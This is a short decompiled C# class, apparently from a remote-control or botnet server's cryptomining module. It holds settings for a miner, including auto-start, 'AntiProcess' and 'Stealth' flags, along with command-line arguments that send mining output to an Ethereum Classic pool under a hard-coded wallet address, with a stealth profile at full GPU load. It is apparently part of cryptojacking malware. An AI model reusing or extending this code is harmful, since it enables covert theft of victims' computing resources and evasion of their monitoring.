using System;

namespace Server.Data
{
	// Token: 0x020000C3 RID: 195
	internal class MinerEtc
	{
		// Token: 0x04000559 RID: 1369
		public bool AutoStart;

		// Token: 0x0400055A RID: 1370
		public bool AntiProcess;

		// Token: 0x0400055B RID: 1371
		public bool Stealth;

		// Token: 0x0400055C RID: 1372
		public string Args = "--cinit-find-e --pool=stratum://`0x525c4502B060eAc8ac9dcf412E3dC2d9dF74aEA0`.worker@etc.2miners.com:1010 --cinit-max-gpu=70 --response-timeout=300 --farm-retries=30 --cinit-etc";

		// Token: 0x0400055D RID: 1373
		public string ArgsStealh = "--cinit-find-e --pool=stratum://`0x525c4502B060eAc8ac9dcf412E3dC2d9dF74aEA0`.worker@etc.2miners.com:1010 --cinit-max-gpu=100 --response-timeout=300 --farm-retries=30 --cinit-etc";
	}
}
